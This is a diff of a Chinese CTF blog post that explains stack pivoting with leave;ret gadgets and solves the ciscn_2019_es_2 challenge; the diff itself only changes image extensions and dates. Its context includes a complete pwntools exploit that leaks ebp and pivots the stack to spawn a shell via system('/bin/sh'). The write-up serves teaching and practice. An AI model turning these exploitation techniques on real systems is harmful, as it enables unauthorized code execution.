@@ -26,27 +26,27 @@
 <meta property="og:site_name" content="KubanSec&#39;s blog">
 <meta property="og:description" content="前置知识：什么是栈迁移？ https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;stackoverflow&#x2F;x86&#x2F;fancy-rop&#x2F;#stack-pivoting  首先看一下正常的程序结构，函数在结束时会进行leave和ret指令——leave做两件事，第一件事是mov esp,ebp，也就是将esp移到ebp的位置，第二件事是pop ebp，也就是将ebp移">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://kubansec.github.io/img/p1/s1.PNG">
-<meta property="og:image" content="http://kubansec.github.io/img/p1/s2.PNG">
-<meta property="og:image" content="http://kubansec.github.io/img/p1/s3.PNG">
-<meta property="og:image" content="http://kubansec.github.io/img/p1/s4.PNG">
-<meta property="og:image" content="http://kubansec.github.io/img/p1/s5.PNG">
-<meta property="og:image" content="http://kubansec.github.io/img/p1/s6.PNG">
-<meta property="og:image" content="http://kubansec.github.io/img/p1/s7.PNG">
+<meta property="og:image" content="http://kubansec.github.io/img/p1/s1.png">
+<meta property="og:image" content="http://kubansec.github.io/img/p1/s2.png">
+<meta property="og:image" content="http://kubansec.github.io/img/p1/s3.png">
+<meta property="og:image" content="http://kubansec.github.io/img/p1/s4.png">
+<meta property="og:image" content="http://kubansec.github.io/img/p1/s5.png">
+<meta property="og:image" content="http://kubansec.github.io/img/p1/s6.png">
+<meta property="og:image" content="http://kubansec.github.io/img/p1/s7.png">
 <meta property="og:image" content="http://kubansec.github.io/img/p1/s8.png">
 <meta property="og:image" content="http://kubansec.github.io/img/p1/s9.png">
 <meta property="og:image" content="http://kubansec.github.io/img/p1/s10.png">
 <meta property="og:image" content="http://kubansec.github.io/img/p1/s11.png">
 <meta property="og:image" content="http://kubansec.github.io/img/p1/s12.png">
 <meta property="article:published_time" content="2024-11-07T08:06:15.000Z">
-<meta property="article:modified_time" content="2024-11-12T09:28:05.218Z">
+<meta property="article:modified_time" content="2024-11-24T07:55:31.612Z">
 <meta property="article:author" content="KubanSec">
 <meta property="article:tag" content="栈迁移">
 <meta property="article:tag" content="ciscn_2019_es_2">
 <meta property="article:tag" content="Black Watch 入群题-PWN1">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://kubansec.github.io/img/p1/s1.PNG">
+<meta name="twitter:image" content="http://kubansec.github.io/img/p1/s1.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -319,17 +319,17 @@
 <h1 id="前置知识：什么是栈迁移？"><a href="#前置知识：什么是栈迁移？" class="headerlink" title="前置知识：什么是栈迁移？"></a>前置知识：什么是栈迁移？</h1><blockquote>
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting</a></p>
 </blockquote>
-<p>首先看一下正常的程序结构，函数在结束时会进行leave和ret指令<br>——leave做两件事，第一件事是mov esp,ebp，也就是将esp移到ebp的位置，第二件事是pop ebp，也就是将ebp移到上一个函数的记录的位置上去<br>——ret就做一件事pop eip，也就是将esp中的内容弹入eip中，也就是内容放到程序的执行流上。<br><img src="/img/p1/s1.PNG" srcset="/img/loading.gif" lazyload><br>在栈迁移中，很多情况下我们需要在栈上的返回地址覆盖为leave_ret的gadget上（这里的0xcffc），让程序执行两次leave_ret，那连续的两个leave_ret后栈会发生什么变化呢？<br>回到初始状态，假设我们的栈可以溢出到返回地址，我们将ebp覆盖为esp的地址（0xcfd0），返回地址覆盖为一个leave_ret的gadget，观察下面的图<br><img src="/img/p1/s2.PNG" srcset="/img/loading.gif" lazyload><br>可以看到，栈在经历过两次leave_ret后，程序的执行流又回到了我们的栈空间，那如果我们在写入数据的时候，从0xcfd4的位置开始写入我们的system函数的地址，那就可以把system函数放到程序的执行流，从而执行我们的system(‘&#x2F;bin&#x2F;sh’)</p>
+<p>首先看一下正常的程序结构，函数在结束时会进行leave和ret指令<br>——leave做两件事，第一件事是mov esp,ebp，也就是将esp移到ebp的位置，第二件事是pop ebp，也就是将ebp移到上一个函数的记录的位置上去<br>——ret就做一件事pop eip，也就是将esp中的内容弹入eip中，也就是内容放到程序的执行流上。<br><img src="/img/p1/s1.png" srcset="/img/loading.gif" lazyload><br>在栈迁移中，很多情况下我们需要在栈上的返回地址覆盖为leave_ret的gadget上（这里的0xcffc），让程序执行两次leave_ret，那连续的两个leave_ret后栈会发生什么变化呢？<br>回到初始状态，假设我们的栈可以溢出到返回地址，我们将ebp覆盖为esp的地址（0xcfd0），返回地址覆盖为一个leave_ret的gadget，观察下面的图<br><img src="/img/p1/s2.png" srcset="/img/loading.gif" lazyload><br>可以看到，栈在经历过两次leave_ret后，程序的执行流又回到了我们的栈空间，那如果我们在写入数据的时候，从0xcfd4的位置开始写入我们的system函数的地址，那就可以把system函数放到程序的执行流，从而执行我们的system(‘&#x2F;bin&#x2F;sh’)</p>
 <hr>
 <p>通过两道例题实践栈迁移</p>
 <h1 id="例1：ciscn-2019-es-2"><a href="#例1：ciscn-2019-es-2" class="headerlink" title="例1：ciscn_2019_es_2"></a>例1：ciscn_2019_es_2</h1><blockquote>
 <p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_es_2">https://buuoj.cn/challenges#ciscn_2019_es_2</a></p>
 </blockquote>
-<p>checksec;file：32位，开启NX保护<br><img src="/img/p1/s3.PNG" srcset="/img/loading.gif" lazyload></p>
-<p>IDA里面分析，栈溢出发生在vul函数，但是只可以溢出0x8的字节，这只能够覆盖ebp_main和返回地址，而想再向栈上像ret2text那样写入system和binsh显然不可行<br><img src="/img/p1/s4.PNG" srcset="/img/loading.gif" lazyload></p>
-<p>这个时候就要考虑栈迁移了<br>程序存在system函数，但没有binsh字符串，我们需要向某个地址写入binsh<br><img src="/img/p1/s5.PNG" srcset="/img/loading.gif" lazyload></p>
-<p>那向哪个位置写入我们的binsh呢？其实就可以写到这个栈中，只要拿到了ebp的地址，就可以通过偏移拿到栈上任意内容的地址。<br>那ebp的地址怎么拿到呢？我们知道read函数结束时会自动加‘\x00’作为字符串的截断，然后输出时遇到’\x00’停止输出，如果我们在第一次read的时候给他填满0x30个字符，那么read就没地方给他补上’\x00’了，那么输出的时候打印完0x30个字符，就会继续打印出ebp的地址了。<br>第一次read拿到ebp的地址后，第二次read就要控制程序的执行流了<br>根据前置知识布置一下栈结构<br><img src="/img/p1/s6.PNG" srcset="/img/loading.gif" lazyload></p>
-<p>gdb调试看一下read后的栈结构，偏移为0x28(&#x3D;0xf8-0xd0)，同时这个0x28也是我们写入的字符串距离ebp的位置<br><img src="/img/p1/s7.PNG" srcset="/img/loading.gif" lazyload></p>
+<p>checksec;file：32位，开启NX保护<br><img src="/img/p1/s3.png" srcset="/img/loading.gif" lazyload></p>
+<p>IDA里面分析，栈溢出发生在vul函数，但是只可以溢出0x8的字节，这只能够覆盖ebp_main和返回地址，而想再向栈上像ret2text那样写入system和binsh显然不可行<br><img src="/img/p1/s4.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个时候就要考虑栈迁移了<br>程序存在system函数，但没有binsh字符串，我们需要向某个地址写入binsh<br><img src="/img/p1/s5.png" srcset="/img/loading.gif" lazyload></p>
+<p>那向哪个位置写入我们的binsh呢？其实就可以写到这个栈中，只要拿到了ebp的地址，就可以通过偏移拿到栈上任意内容的地址。<br>那ebp的地址怎么拿到呢？我们知道read函数结束时会自动加‘\x00’作为字符串的截断，然后输出时遇到’\x00’停止输出，如果我们在第一次read的时候给他填满0x30个字符，那么read就没地方给他补上’\x00’了，那么输出的时候打印完0x30个字符，就会继续打印出ebp的地址了。<br>第一次read拿到ebp的地址后，第二次read就要控制程序的执行流了<br>根据前置知识布置一下栈结构<br><img src="/img/p1/s6.png" srcset="/img/loading.gif" lazyload></p>
+<p>gdb调试看一下read后的栈结构，偏移为0x28(&#x3D;0xf8-0xd0)，同时这个0x28也是我们写入的字符串距离ebp的位置<br><img src="/img/p1/s7.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">esp_addr</span> = ebp_addr - <span class="hljs-number">0</span>x38    <span class="hljs-comment">#这是我们迁移的位置(迁移到栈顶)</span><br><span class="hljs-attr">binsh_addr</span> = ebp_addr - <span class="hljs-number">0</span>x28    <span class="hljs-comment">#这是我们写入的binsh距离ebp的位置</span><br></code></pre></td></tr></table></figure>
 
 <h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,<span class="hljs-built_in">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26904</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br><br>system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>leave_ret = <span class="hljs-number">0x08048562</span>          #<span class="hljs-number">0x08048562</span> : leave ; ret<br><br>payload1 = b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">36</span> + b<span class="hljs-string">&#x27;bbbb&#x27;</span><br><span class="hljs-built_in">io</span>.sendafter(<span class="hljs-string">&#x27;name?\n&#x27;</span>,payload1)<br><span class="hljs-built_in">io</span>.recvuntil(b<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>ebp_addr = u32(<span class="hljs-built_in">io</span>.recv(<span class="hljs-number">4</span>))<br>success(hex(ebp_addr))<br>esp_addr = ebp_addr - <span class="hljs-number">0x38</span><br>binsh_addr = ebp_addr - <span class="hljs-number">0x28</span><br><br>payload2 = b<span class="hljs-string">&#x27;aaaa&#x27;</span>+ p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh_addr) + b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>payload2 = payload2.ljust(<span class="hljs-number">0x28</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p32(ebp_addr<span class="hljs-number">-0x38</span>) + p32(leave_ret)<br><br><span class="hljs-built_in">io</span>.sendline(payload2)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure>
@@ -434,7 +434,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年11月12日</div>
+          <div>2024年11月24日</div>
         </div>
       
       
